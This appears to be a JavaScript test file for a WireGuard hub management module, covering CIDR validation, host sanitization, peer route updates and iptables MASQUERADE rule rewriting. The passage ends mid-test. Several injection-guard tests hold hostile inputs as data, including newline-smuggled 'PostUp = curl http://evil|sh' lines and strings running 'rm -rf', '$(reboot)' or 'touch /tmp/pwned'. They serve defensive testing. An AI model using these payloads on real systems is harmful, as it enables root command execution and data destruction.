import assert from "node:assert/strict";
import { access, chmod, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import error from "../lib/error.js";
import {
	_buildPeerUpdates,
	_isGeneratedMasq,
	_masqIptablesBin,
	_previousOwnedMasq,
	_rewriteHubConf,
	_tunnelSubnetFromConfLines,
	buildClientConfig,
	buildLinkRecord,
	canonicalizeIpv4Network,
	configuredHubHost,
	isValidInterfaceAddress,
	resolveHubHost,
	buildRouteAnalysis,
	buildTopology,
	classifyLinkType,
	enrichInterfaceStatus,
	enrichLinkRecord,
	normalizeInterfaceRole,
	normalizeLinkType,
	sanitizeInterfaceMetadataPatch,
	sanitizeLinkMetadataPatch,
} from "./wireguard.js";

// ─── canonicalizeIpv4Network (host-bits masking + IPv6 rejection) ────────────

test("canonicalizeIpv4Network masks host bits and rejects IPv6 / out-of-range / no-prefix", () => {
	assert.equal(canonicalizeIpv4Network("192.168.10.1/24"), "192.168.10.0/24");
	assert.equal(canonicalizeIpv4Network("10.5.5.5/8"), "10.0.0.0/8");
	assert.equal(canonicalizeIpv4Network("192.168.10.0/24"), "192.168.10.0/24");
	assert.equal(canonicalizeIpv4Network(" 172.16.4.9/12 "), "172.16.0.0/12");
	assert.equal(canonicalizeIpv4Network("fd00:50::/64"), null, "IPv6 rejected — mesh routes IPv4 site nets only");
	assert.equal(canonicalizeIpv4Network("999.0.0.0/8"), null, "out-of-range octet");
	assert.equal(canonicalizeIpv4Network("10.0.0.0/33"), null, "bad prefix");
	assert.equal(canonicalizeIpv4Network("10.0.0.0"), null, "missing prefix");
});

// ─── resolveHubHost / configuredHubHost (WG_HUB_HOST sanitization) ───────────

test("configuredHubHost returns a clean WG_HUB_HOST, trimmed", () => {
	const prev = process.env.WG_HUB_HOST;
	try {
		process.env.WG_HUB_HOST = "  proxy.comnic.de  ";
		assert.equal(configuredHubHost(), "proxy.comnic.de");
		process.env.WG_HUB_HOST = "95.216.66.221";
		assert.equal(configuredHubHost(), "95.216.66.221");
	} finally {
		if (prev === undefined) delete process.env.WG_HUB_HOST;
		else process.env.WG_HUB_HOST = prev;
	}
});

test("configuredHubHost returns null for unset / whitespace / injected values", () => {
	const prev = process.env.WG_HUB_HOST;
	try {
		delete process.env.WG_HUB_HOST;
		assert.equal(configuredHubHost(), null, "unset");
		process.env.WG_HUB_HOST = "   ";
		assert.equal(configuredHubHost(), null, "all whitespace");
		process.env.WG_HUB_HOST = "evil.com\nPreUp = curl x|sh";
		assert.equal(configuredHubHost(), null, "newline injection");
		process.env.WG_HUB_HOST = "proxy .comnic.de";
		assert.equal(configuredHubHost(), null, "embedded space");
	} finally {
		if (prev === undefined) delete process.env.WG_HUB_HOST;
		else process.env.WG_HUB_HOST = prev;
	}
});

test("configuredHubHost bracket-wraps a bare IPv6 so host:port stays valid", () => {
	const prev = process.env.WG_HUB_HOST;
	try {
		process.env.WG_HUB_HOST = "2a01:4f9:2b:307::221";
		assert.equal(configuredHubHost(), "[2a01:4f9:2b:307::221]");
		// Already-bracketed is left as-is (not double-wrapped).
		process.env.WG_HUB_HOST = "[2a01:4f9:2b:307::221]";
		assert.equal(configuredHubHost(), "[2a01:4f9:2b:307::221]");
	} finally {
		if (prev === undefined) delete process.env.WG_HUB_HOST;
		else process.env.WG_HUB_HOST = prev;
	}
});

test("resolveHubHost trims a valid value but falls back to OS hostname when malformed", () => {
	const prev = process.env.WG_HUB_HOST;
	try {
		process.env.WG_HUB_HOST = "  hub.example.com  ";
		assert.equal(resolveHubHost(), "hub.example.com");
		process.env.WG_HUB_HOST = "bad host\nwith newline";
		assert.equal(resolveHubHost(), os.hostname());
	} finally {
		if (prev === undefined) delete process.env.WG_HUB_HOST;
		else process.env.WG_HUB_HOST = prev;
	}
});

// ─── isValidInterfaceAddress (newline/PostUp injection guard for createInterface) ─

test("isValidInterfaceAddress accepts clean host CIDRs and rejects injection / malformed input", () => {
	// Valid IPv4 host addresses with a prefix — host bits are intentionally kept.
	assert.equal(isValidInterfaceAddress("10.20.0.1/24"), true);
	assert.equal(isValidInterfaceAddress(" 10.10.0.1/25 "), true, "surrounding whitespace trimmed");
	assert.equal(isValidInterfaceAddress("192.168.1.254/32"), true);
	// Valid IPv6 host with a mandatory prefix.
	assert.equal(isValidInterfaceAddress("fd00:50::1/64"), true);

	// The core RCE vector: a newline that survives String.trim() and would inject an
	// attacker-controlled `PostUp = <cmd>` line into the wg-quick conf (run as root).
	assert.equal(isValidInterfaceAddress("10.20.0.1/24\nPostUp = curl http://evil|sh"), false);
	assert.equal(isValidInterfaceAddress("10.20.0.1/24 PostUp = id"), false, "embedded space rejected");
	assert.equal(isValidInterfaceAddress("10.20.0.1/24; reboot"), false);
	assert.equal(isValidInterfaceAddress("10.20.0.1"), false, "missing prefix");
	assert.equal(isValidInterfaceAddress("999.0.0.1/24"), false, "octet out of range");
	assert.equal(isValidInterfaceAddress("10.20.0.1/33"), false, "prefix out of range");
	assert.equal(isValidInterfaceAddress("fd00::1"), false, "IPv6 without prefix rejected");
	assert.equal(isValidInterfaceAddress(""), false);
	assert.equal(isValidInterfaceAddress(null), false);
});

// ─── link name control-char stripping (newline/PostUp injection guard) ───────

// A peer/link name is rendered verbatim as a `# <name>` comment line into the
// wg-quick conf; an embedded newline could smuggle an attacker-controlled
// `[Interface]`/`PostUp = <cmd>` line that wg-quick runs as root. The name sink must
// strip control characters so a malicious value can never be persisted and re-rendered.
test("sanitizeLinkMetadataPatch strips control characters from the name (no conf injection)", () => {
	const link = sanitizeLinkMetadataPatch({
		type: "client",
		name: "evil\n[Interface]\nPostUp = curl http://evil|sh",
	});
	assert.equal(link.name, "evil[Interface]PostUp = curl http://evil|sh");
	assert.ok(!link.name.includes("\n"), "newlines removed");
	// A clean name is preserved unchanged.
	assert.equal(sanitizeLinkMetadataPatch({ name: "Office Laptop" }).name, "Office Laptop");
});

// ─── _buildPeerUpdates (hub-side AllowedIPs recompute) ───────────────────────

// Regression (Fix #5): an untyped single-subnet site link must NOT be degraded to
// "client" by the ≤1-route heuristic — that would strip its LAN from the hub peer
// while agent-side _collectSiteNetworks keeps advertising it (split-brain).
test("_buildPeerUpdates keeps an untyped single-subnet link as a site (no strip)", () => {
	const peerMap = new Map([["PK1", ["10.10.0.6/32", "192.168.60.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", importedNetworks: ["192.168.60.0/24"] } }; // no type
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.ok(!updates.has("PK1"), "untyped site must keep its subnet (no update)");
});

test("_buildPeerUpdates strips an EXPLICIT client to host routes only", () => {
	const peerMap = new Map([["PK1", ["10.10.0.6/32", "192.168.60.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", type: "client", importedNetworks: ["192.168.60.0/24"] } };
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.deepEqual(updates.get("PK1"), ["10.10.0.6/32"]);
});

// Regression (Fix #4): emptying importedNetworks to [] must DROP the subnet hub-side
// (authoritative), not fall back to the conf's current CIDRs and re-inject it.
test("_buildPeerUpdates drops the subnet when importedNetworks is explicitly empty", () => {
	const peerMap = new Map([["PK1", ["10.10.0.5/32", "192.168.50.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", type: "site-to-site", importedNetworks: [] } };
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.deepEqual(updates.get("PK1"), ["10.10.0.5/32"]);
});

test("_buildPeerUpdates preserves conf CIDRs when metadata has NO importedNetworks key", () => {
	const peerMap = new Map([["PK1", ["10.10.0.5/32", "192.168.50.0/24"]]]);
	const linksMeta = { "wg0:PK1": { name: "X", type: "site-to-site" } }; // legacy/unmanaged
	const updates = _buildPeerUpdates(peerMap, linksMeta, "wg0");
	assert.ok(!updates.has("PK1"), "absent key = legacy → preserve existing non-host CIDRs");
});

async function withWireGuardEnv(env, suffix, fn) {
	const previous = {
		WG_CONF_DIR: process.env.WG_CONF_DIR,
		WG_BIN: process.env.WG_BIN,
		IP_BIN: process.env.IP_BIN,
		WG_METADATA_FILE: process.env.WG_METADATA_FILE,
	};

	Object.assign(process.env, env);

	try {
		const imported = await import(`./wireguard.js?case=${suffix}`);
		return await fn(imported);
	} finally {
		for (const [key, value] of Object.entries(previous)) {
			if (value === undefined) {
				delete process.env[key];
			} else {
				process.env[key] = value;
			}
		}
	}
}

test("normalize and sanitize metadata keep the canonical wireguard vocabulary", () => {
	assert.equal(normalizeLinkType("site-link"), "site-to-site");
	assert.equal(normalizeInterfaceRole("site-link"), "site-to-site");

	assert.deepEqual(
		sanitizeLinkMetadataPatch({
			type: "site-link",
			exportedNetworks: ["10.0.0.0/24", "10.0.0.0/24", "", null],
			importedNetworks: ["192.168.50.0/24"],
			returnPathMode: "static-route",
			remoteManagementMode: "ssh",
			planIntent: "site-to-site",
			planState: "validate",
			notes: ["review", "review", ""],
		}),
		{
			type: "site-to-site",
			exportedNetworks: ["10.0.0.0/24"],
			importedNetworks: ["192.168.50.0/24"],
			returnPathMode: "static-route",
			remoteManagementMode: "ssh",
			planIntent: "site-to-site",
			planState: "validate",
			notes: ["review"],
		},
	);

	assert.deepEqual(
		sanitizeInterfaceMetadataPatch({
			role: "site-link",
			managementMode: "imported",
			exportedNetworks: ["10.10.0.0/24", "10.10.0.0/24"],
			importedNetworks: ["192.168.60.0/24"],
			routeTargets: ["192.168.60.0/24", ""],
			notes: ["needs review", "needs review"],
		}),
		{
			role: "site-to-site",
			managementMode: "imported",
			exportedNetworks: ["10.10.0.0/24"],
			importedNetworks: ["192.168.60.0/24"],
			routeTargets: ["192.168.60.0/24"],
			notes: ["needs review"],
		},
	);
});

test("network metadata rejects shell-injection and malformed CIDR values", () => {
	// Network fields flow into `ip route add <net>` PostUp shell strings executed
	// as root, so anything that isn't a clean IPv4 CIDR is rejected (IPv6 site nets
	// are out of scope) — never silently dropped — and host bits are masked.
	const bad = [
		"10.0.0.0/24; rm -rf /etc/wireguard",
		"10.0.0.0/24 || curl evil|sh",
		"$(reboot)",
		"`id`",
		"-x",
		"999.1.1.1/24",
		"fd00::/64",
		"not a cidr",
		"10.0.0.0/24\nPostUp = id",
		"; touch /tmp/pwned",
	];
	for (const entry of bad) {
		assert.throws(
			() => sanitizeLinkMetadataPatch({ exportedNetworks: ["10.0.0.0/24", entry] }),
			error.ValidationError,
			entry,
		);
		assert.throws(
			() => sanitizeInterfaceMetadataPatch({ routeTargets: ["10.0.0.0/24", entry] }),
			error.ValidationError,
			entry,
		);
	}
	// Valid entries are canonicalized and deduped; empty/null CSV artefacts ignored.
	const link = sanitizeLinkMetadataPatch({ exportedNetworks: ["10.0.0.0/24", "10.0.0.5/24", "", null] });
	assert.deepEqual(link.exportedNetworks, ["10.0.0.0/24"]);
});

test("a typo'd network is rejected, not stored as [] (= every net revoked)", () => {
	assert.throws(() => sanitizeLinkMetadataPatch({ importedNetworks: ["10.3.20.0/24x"] }), /10\.3\.20\.0\/24x/);
});

test("classifyLinkType keeps single-network wg0 peers in the client bucket", () => {
	assert.equal(classifyLinkType(["192.168.50.0/24"], "wg0"), "client");
	assert.equal(classifyLinkType(["192.168.50.10/32"], "wg0"), "client");
	assert.equal(classifyLinkType(["192.168.50.0/24", "192.168.60.0/24"], "wg0"), "hub-link");
	assert.equal(classifyLinkType(["192.168.200.0/24"], "wg1"), "site-to-site");
});

test("buildRouteAnalysis excludes imported networks already covered by static private routes", () => {
	const topology = buildTopology(
		[
			{
				exportedNetworks: ["10.10.0.0/24"],
				importedNetworks: ["192.168.50.0/24", "192.168.60.0/24"],
			},
		],
		[],
	);

	const routeAnalysis = buildRouteAnalysis(
		{
			all: [
				{
					destination: "192.168.50.0/24",
					device: "eth0",
					via: "10.0.0.1",
					raw: "192.168.50.0/24 via 10.0.0.1 dev eth0",
				},
				{ destination: "10.10.0.0/24", device: "wg0", via: null, raw: "10.10.0.0/24 dev wg0" },
			],
			wireguard: [{ destination: "10.10.0.0/24", device: "wg0", via: null, raw: "10.10.0.0/24 dev wg0" }],
			privateRoutes: [
				{
					destination: "192.168.50.0/24",
					device: "eth0",
					via: "10.0.0.1",
					raw: "192.168.50.0/24 via 10.0.0.1 dev eth0",
				},
				{ destination: "10.10.0.0/24", device: "wg0", via: null, raw: "10.10.0.0/24 dev wg0" },
			],
		},
		topology,
	);

	assert.deepEqual(routeAnalysis.missingReturnRoutes, [
		{ network: "192.168.60.0/24", reason: "network-not-found-in-live-routes" },
	]);
	// NAT candidates come from links with an undecided return path — this topology has none.
	assert.deepEqual(routeAnalysis.natCandidates, []);
	assert.equal(routeAnalysis.staticRoutes.length, 1);
	assert.match(routeAnalysis.observations.join(" "), /Static private routes exist outside WireGuard/);
});

test("enrichLinkRecord derives warnings, next actions and plan state from route gaps", () => {
	const rawLink = buildLinkRecord(
		"wg1",
		{
			publicKey: "site-peer-key",
			endpoint: null,
			allowedIps: ["192.168.200.0/24"],
			latestHandshake: 0,
			rxBytes: 1,
			txBytes: 2,
			isActive: false,
		},
		0,
		{
			type: "site-link",
			importedNetworks: ["192.168.200.0/24"],
			exportedNetworks: [],
			returnPathMode: "unknown",
			remoteManagementMode: "unknown",
			planIntent: "site-to-site",
		},
	);

	const routeAnalysis = {
		missingReturnRoutes: [{ network: "192.168.200.0/24", reason: "network-not-found-in-live-routes" }],
		natCandidates: [{ network: "192.168.200.0/24", reason: "return-path-unclear" }],
	};

	const link = enrichLinkRecord(rawLink, routeAnalysis);

	assert.equal(link.type, "site-to-site");
	assert.equal(link.planState, "discover");
	assert.deepEqual(
		link.warnings.sort(),
		[
			"exported-networks-missing",
			"imported-network-missing-live-route",
			"link-not-currently-active",
			"nat-likely-needed",
			"remote-endpoint-missing",
			"remote-management-mode-undefined",
			"return-path-mode-undefined",
		].sort(),
	);
	assert.deepEqual(
		link.nextActions.sort(),
		[
			"decide-nat-or-static-route",
			"define-remote-management-mode",
			"define-return-path-mode",
			"fix-return-path",
			"model-exported-networks",
			"verify-live-tunnel-state",
			"verify-return-path",
		].sort(),
	);
});

test("enrichInterfaceStatus marks inactive interfaces with risky links as warning", () => {
	const enriched = enrichInterfaceStatus(
		{
			name: "wg1",
			active: false,
			configExists: true,
			privateKeyPresent: true,
			peerCount: 1,
			importedNetworks: ["192.168.200.0/24"],
			notes: [],
		},
		[
			{
				interfaceName: "wg1",
				warnings: ["return-path-mode-undefined"],
			},
		],
	);

	assert.equal(enriched.health, "warning");
	assert.deepEqual(
		enriched.notes.sort(),
		["1 link(s) on this interface need review", "inactive interface with imported networks"].sort(),
	);
});

test("getStatus composes runtime, metadata and route analysis into one status object", async () => {
	const tempRoot = await mkdtemp(path.join(os.tmpdir(), "wg-status-test-"));
	const confDir = path.join(tempRoot, "conf");
	const binDir = path.join(tempRoot, "bin");
	const metadataFile = path.join(tempRoot, "wireguard-metadata.json");
	await mkdir(confDir, { recursive: true });
	await mkdir(binDir, { recursive: true });

	await writeFile(
		path.join(confDir, "wg0.conf"),
		`[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = local-private-key

[Peer]
AllowedIPs = 192.168.50.0/24
`,
		"utf8",
	);

	await writeFile(
		path.join(confDir, "wg1.conf"),
		`[Interface]
Address = 10.1.0.1/24
ListenPort = 51821
PrivateKey = remote-private-key

[Peer]
AllowedIPs = 192.168.200.0/24
`,
		"utf8",
	);

	await writeFile(
		metadataFile,
		`${JSON.stringify(
			{
				interfaces: {
					wg1: {
						role: "site-link",
						managementMode: "imported",
						exportedNetworks: ["10.20.0.0/24"],
						importedNetworks: ["192.168.200.0/24"],
						routeTargets: ["192.168.200.0/24"],
						notes: ["field note"],
					},
				},
				links: {
					"wg1:site-peer-key": {
						type: "site-link",
						name: "site-a",
						exportedNetworks: ["10.20.0.0/24"],
						importedNetworks: ["192.168.200.0/24"],
						returnPathMode: "static-route",
						remoteManagementMode: "ssh",
						planIntent: "site-to-site",
						planState: "validate",
						notes: ["planned link"],
					},
				},
			},
			null,
			2,
		)}\n`,
		"utf8",
	);

	const wgBin = path.join(binDir, "wg-test");
	await writeFile(
		wgBin,
		`#!/usr/bin/env bash
printf 'wg0\\tprivate0\\thub-public-key\\t51820\\toff\\n'
printf 'wg0\\tpeer-public-key\\t(psk)\\tpeer.example.com:51820\\t192.168.50.0/24\\t4102444800\\t10\\t20\\t0\\n'
printf 'wg1\\tprivate1\\tsite-public-key\\t51821\\toff\\n'
printf 'wg1\\tsite-peer-key\\t(psk)\\t\\t192.168.200.0/24\\t0\\t1\\t2\\t0\\n'
`,
		"utf8",
	);
	await chmod(wgBin, 0o755);

	const ipBin = path.join(binDir, "ip-test");
	await writeFile(
		ipBin,
		`#!/usr/bin/env bash
if [ "$1" = "route" ] && [ "$2" = "show" ]; then
	printf '10.0.0.0/24 dev wg0\\n'
	printf '192.168.50.0/24 dev wg0\\n'
	printf '10.20.0.0/24 dev wg1\\n'
fi
`,
		"utf8",
	);
	await chmod(ipBin, 0o755);

	try {
		await withWireGuardEnv(
			{
				WG_CONF_DIR: confDir,
				WG_BIN: wgBin,
				IP_BIN: ipBin,
				WG_METADATA_FILE: metadataFile,
			},
			Date.now(),
			async (imported) => {
				const status = await imported.default.getStatus();

				assert.equal(status.available, true);
				assert.equal(status.mode, "metadata-write");
				assert.equal(status.summary.interfaceCount, 2);
				assert.equal(status.summary.linkCount, 2);
				assert.equal(status.hub?.name, "wg0");
				assert.equal(status.capabilities.supports.metadataCrud, true);
				assert.deepEqual(status.topology.siteLinks, ["wg1:site-peer-key"]);
				assert.deepEqual(status.topology.clientLinks, ["wg0:peer-public-key"]);
				assert.deepEqual(status.routes.missingReturnRoutes, [
					{ network: "192.168.200.0/24", reason: "network-not-found-in-live-routes" },
				]);

				const siteInterface = status.interfaces.find((item) => item.name === "wg1");
				assert.equal(siteInterface?.role, "site-to-site");
				assert.equal(siteInterface?.managementMode, "imported");
				assert.equal(siteInterface?.health, "warning");
				assert.match((siteInterface?.notes || []).join(" "), /field note/);

				const siteLink = status.links.find((item) => item.id === "wg1:site-peer-key");
				assert.equal(siteLink?.type, "site-to-site");
				assert.equal(siteLink?.name, "site-a");
				assert.equal(siteLink?.planState, "validate");
				assert.equal(siteLink?.remoteManagementMode, "ssh");
				assert.equal(siteLink?.returnPathMode, "static-route");
				assert.match((siteLink?.warnings || []).join(" "), /imported-network-missing-live-route/);
				assert.equal(status.warnings.includes("Interface wg1 needs review"), true);
				assert.equal(status.nextActions.includes("fix-return-path"), true);
			},
		);
	} finally {
		await rm(tempRoot, { recursive: true, force: true });
	}
});

// ─── _rewriteHubConf PostUp/PostDown MASQUERADE ownership ───────────────────

test("_rewriteHubConf keeps operator MASQUERADE rules and never deletes a rule twice in PostDown", () => {
	const lines = [
		"[Interface]",
		"Address = 10.10.0.1/24",
		"# floppyguard-masq: eth1=10.10.0.0/24, eth1=192.168.0.0/16",
		"PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -s 15.0.0.0/24 -o wg0 -j MASQUERADE; iptables -t nat -A POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE",
		"PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE 2>/dev/null || true; iptables -t nat -D POSTROUTING -o eth1 -s 192.168.0.0/16 -j MASQUERADE 2>/dev/null || true; iptables -t nat -D POSTROUTING -s 15.0.0.0/24 -o wg0 -j MASQUERADE; iptables -t nat -D POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE",
		"[Peer]",
		"PublicKey = abc",
		"AllowedIPs = 10.10.0.2/32",
	];
	const nics = [
		{ name: "eth1", cidr: "10.10.10.106/24" },
		{ name: "eth1", cidr: "10.10.0.0/24" },
	];
	const text = _rewriteHubConf(lines, "wg0", new Map(), new Set(["192.168.11.0/24"]), nics);
	const up = text
		.split("\n")
		.find((l) => l.startsWith("PostUp"))
		.slice("PostUp = ".length)
		.split("; ");
	const down = text
		.split("\n")
		.find((l) => l.startsWith("PostDown"))
		.slice("PostDown = ".length)
		.split("; ");
	assert.ok(
		up.includes("iptables -t nat -A POSTROUTING -s 15.0.0.0/24 -o wg0 -j MASQUERADE"),
		"operator rule kept in PostUp",
	);
	assert.ok(
		down.includes("iptables -t nat -D POSTROUTING -s 15.0.0.0/24 -o wg0 -j MASQUERADE"),
		"operator rule kept in PostDown",
	);
	assert.equal(up.filter((c) => c.includes("-s 10.10.0.0/24 -j MASQUERADE")).length, 1);
	const tunnelDel = down.filter((c) => c.includes("-o eth1 -s 10.10.0.0/24 -j MASQUERADE"));
	assert.deepEqual(tunnelDel, [
		"iptables -t nat -D POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE 2>/dev/null || true",
	]);
	assert.ok(!down.some((c) => c.includes("192.168.0.0/16")), "previously generated (marker) delete dropped");
	assert.ok(
		text.split("\n").includes("# floppyguard-masq: eth1=10.10.0.0/24, eth1=10.10.10.106/24"),
		"marker records exactly the set written now",
	);
	for (const c of down.filter((c) => c.includes("-j MASQUERADE") && c.includes("-o eth1"))) {
		assert.ok(c.endsWith("2>/dev/null || true"), `PostDown delete must be tolerant: ${c}`);
	}
	// Idempotent: a second rewrite yields the same text.
	assert.equal(_rewriteHubConf(text.split("\n"), "wg0", new Map(), new Set(["192.168.11.0/24"]), nics), text);
});

test("_rewriteHubConf injects only the missing hook (PostUp-only / PostDown-only confs)", () => {
	const nics = [{ name: "eth1", cidr: "10.10.0.0/24" }];
	const nets = new Set(["192.168.11.0/24"]);
	const peer = ["[Peer]", "PublicKey = abc", "AllowedIPs = 10.10.0.2/32"];
	const count = (text, prefix) => text.split("\n").filter((l) => l.startsWith(prefix)).length;

	// PostUp but no PostDown: a PostDown with the tolerant MASQUERADE delete is added
	// (otherwise every wg-quick down/up appended another -A rule).
	const upOnly = _rewriteHubConf(
		["[Interface]", "Address = 10.10.0.1/24", "PostUp = iptables -A FORWARD -i wg0 -j ACCEPT", ...peer],
		"wg0",
		new Map(),
		nets,
		nics,
	);
	assert.equal(count(upOnly, "PostUp = "), 1);
	assert.equal(count(upOnly, "PostDown = "), 1);
	const down = upOnly.split("\n").find((l) => l.startsWith("PostDown = "));
	assert.ok(
		down.includes("iptables -t nat -D POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE 2>/dev/null || true"),
	);

	// PostDown but no PostUp (mirror): one of each, marker directly above PostUp.
	const downOnly = _rewriteHubConf(
		["[Interface]", "Address = 10.10.0.1/24", "PostDown = iptables -D FORWARD -i wg0 -j ACCEPT", ...peer],
		"wg0",
		new Map(),
		nets,
		nics,
	).split("\n");
	assert.equal(downOnly.filter((l) => l.startsWith("PostUp = ")).length, 1);
	assert.equal(downOnly.filter((l) => l.startsWith("PostDown = ")).length, 1);
	const upIdx = downOnly.findIndex((l) => l.startsWith("PostUp = "));
	assert.match(downOnly[upIdx - 1], /^# floppyguard-masq:/);
});

// ─── deletePeer: a failed conf rewrite must leave everything in place ────────

test("deletePeer aborts before the live removal when the conf rewrite fails, so the link stays retryable", async () => {
	const tempRoot = await mkdtemp(path.join(os.tmpdir(), "wg-delete-fail-"));
	const confDir = path.join(tempRoot, "conf");
	const binDir = path.join(tempRoot, "bin");
	const metadataFile = path.join(tempRoot, "meta", "metadata.json");
	const wgLog = path.join(tempRoot, "wg-calls.log");
	await mkdir(confDir, { recursive: true });
	await mkdir(binDir, { recursive: true });
	await mkdir(path.dirname(metadataFile), { recursive: true });

	const confText =
		"[Interface]\nAddress = 10.10.0.1/24\nListenPort = 51820\nPrivateKey = hub-priv\n\n[Peer]\nPublicKey = site-pk\nAllowedIPs = 10.10.0.5/32, 192.168.77.0/24\n";
	const confPath = path.join(confDir, "wg0.conf");
	await writeFile(confPath, confText, "utf8");
	// writeConfAtomic opens `${confPath}.tmp-${pid}` for writing — a directory at
	// that path makes the open fail (EISDIR) even when running as root.
	await mkdir(`${confPath}.tmp-${process.pid}`);
	await writeFile(
		metadataFile,
		`${JSON.stringify({ interfaces: {}, links: { "wg0:site-pk": { name: "site-x", type: "site-to-site" } } })}\n`,
		"utf8",
	);

	const wgBin = path.join(binDir, "wg-test");
	await writeFile(
		wgBin,
		`#!/usr/bin/env bash
echo "$*" >> '${wgLog}'
if [ "$1" = "show" ]; then
	printf 'wg0\\thub-priv\\thub-pub\\t51820\\toff\\n'
	printf 'wg0\\tsite-pk\\t(none)\\t1.2.3.4:51820\\t10.10.0.5/32,192.168.77.0/24\\t4102444800\\t10\\t20\\t0\\n'
fi
`,
		"utf8",
	);
	await chmod(wgBin, 0o755);
	const ipBin = path.join(binDir, "ip-test");
	await writeFile(ipBin, "#!/usr/bin/env bash\nexit 0\n", "utf8");
	await chmod(ipBin, 0o755);

	try {
		await withWireGuardEnv(
			{ WG_CONF_DIR: confDir, WG_BIN: wgBin, IP_BIN: ipBin, WG_METADATA_FILE: metadataFile },
			`delete-fail-${Date.now()}`,
			async (imported) => {
				imported._setBoundAgentCascadeDepsForTests({ loadAgents: async () => [] });
				await assert.rejects(imported.default.deletePeer("wg0:site-pk"), /could not be rewritten/);
				const { readFile } = await import("node:fs/promises");
				const calls = await readFile(wgLog, "utf8");
				assert.ok(!/\bset wg0 peer site-pk remove\b/.test(calls), "live peer must not be removed");
				assert.equal(await readFile(confPath, "utf8"), confText, "conf untouched");
				const meta = JSON.parse(await readFile(metadataFile, "utf8"));
				assert.ok(meta.links["wg0:site-pk"], "metadata link kept");
				const status = await imported.default.getStatus();
				assert.ok(
					status.links.some((l) => l.id === "wg0:site-pk"),
					"link still in status → retry possible",
				);
			},
		);
	} finally {
		await rm(tempRoot, { recursive: true, force: true });
	}
});

// ─── _isGeneratedMasq: ownership by set membership, both argument orders ─────

test("_isGeneratedMasq: only the generator form with an owned (nic, cidr) is generated", () => {
	const owned = new Set(["eth1=10.10.0.0/24"]);
	// Generator form, owned → generated (with and without the PostDown suffix).
	assert.equal(
		_isGeneratedMasq("iptables -t nat -A POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE", "wg0", owned),
		true,
	);
	assert.equal(
		_isGeneratedMasq(
			"iptables -t nat -D POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE 2>/dev/null || true",
			"wg0",
			owned,
		),
		true,
	);
	// Operator rule in the natural `-o eth1 -s X` order for a net we never owned → kept.
	assert.equal(
		_isGeneratedMasq("iptables -t nat -A POSTROUTING -o eth1 -s 172.16.5.0/24 -j MASQUERADE", "wg0", owned),
		false,
	);
	// `-s X -o <if>` order is never generator output — kept even for an owned pair.
	assert.equal(
		_isGeneratedMasq("iptables -t nat -A POSTROUTING -s 10.10.0.0/24 -o eth1 -j MASQUERADE", "wg0", owned),
		false,
	);
	assert.equal(
		_isGeneratedMasq("iptables -t nat -A POSTROUTING -s 15.0.0.0/24 -o wg0 -j MASQUERADE", "wg0", owned),
		false,
	);
	// Never the WireGuard interface itself.
	assert.equal(
		_isGeneratedMasq(
			"iptables -t nat -A POSTROUTING -o wg0 -s 10.10.0.0/24 -j MASQUERADE",
			"wg0",
			new Set(["wg0=10.10.0.0/24"]),
		),
		false,
	);
	// No owned set → nothing is generated.
	assert.equal(
		_isGeneratedMasq("iptables -t nat -A POSTROUTING -o eth1 -s 10.10.0.0/24 -j MASQUERADE", "wg0"),
		false,
	);
});

test("_rewriteHubConf keeps an operator `-o eth1 -s X` rule in both orders across rewrites", () => {
	const lines = [
		"[Interface]",
		"Address = 10.10.0.1/24",
		"PostUp = iptables -t nat -A POSTROUTING -o eth1 -s 172.16.5.0/24 -j MASQUERADE; iptables -t nat -A POSTROUTING -s 172.16.6.0/24 -o eth1 -j MASQUERADE",
		"PostDown = iptables -t nat -D POSTROUTING -o eth1 -s 172.16.5.0/24 -j MASQUERADE; iptables -t nat -D POSTROUTING -s 172.16.6.0/24 -o eth1 -j MASQUERADE",
		"",
		"# Site A",
		"[Peer]",
		"PublicKey = abc",
		"AllowedIPs = 10.10.0.2/32",
	];
	const nics = [{ name: "eth1", cidr: "10.10.0.0/24" }];
	const once = _rewriteHubConf(lines, "wg0", new Map(), new Set(), nics);
	const twice = _rewriteHubConf(once.split("\n"), "wg0", new Map(), new Set(), nics);
	assert.equal(twice, once, "idempotent");
	for (const rule of [
		"iptables -t nat -A POSTROUTING -o eth1 -s 172.16.5.0/24 -j MASQUERADE",
		"iptables -t nat -A POSTROUTING -s 172.16.6.0/24 -o eth1 -j MASQUERADE",
		"iptables -t nat -D POSTROUTING -o eth1 -s 172.16.5.0/24 -j MASQUERADE",
		"iptables -t nat -D POSTROUTING -s 172.16.6.0/24 -o eth1 -j MASQUERADE",
	]) {
		assert.ok(twice.includes(rule), `operator rule kept: ${rule}`);
	}
	// A NIC that disappears: its previously generated rule (recorded in the marker)
	// is dropped, the operator rules stay.
	const third = _rewriteHubConf(twice.split("\n"), "wg0", new Map(), new Set(), []);
	assert.ok(!third.includes("-o eth1 -s 10.10.0.0/24"), "stale generated rule removed via marker");
	assert.ok(third.includes("-o eth1 -s 172.16.5.0/24 -j MASQUERADE"), "operator rule still kept");
	assert.ok(third.includes("# floppyguard-masq: -"));
	// The marker sits above PostUp, never directly before a [Peer] block.
	const ls = twice.split("\n");
	assert.match(ls[ls.findIndex((l) => l.startsWith("# floppyguard-masq:")) + 1], /^PostUp = /);
});

// ─── _tunnelSubnetFromConfLines (MASQUERADE -s of the tunnel) ────────────────

test("_tunnelSubnetFromConfLines canonicalizes the Address with its real prefix", () => {
	const t = (addr) => _tunnelSubnetFromConfLines(["[Interface]", addr, "ListenPort = 51820"]);
	assert.equal(t("Address = 10.10.0.1/24"), "10.10.0.0/24");
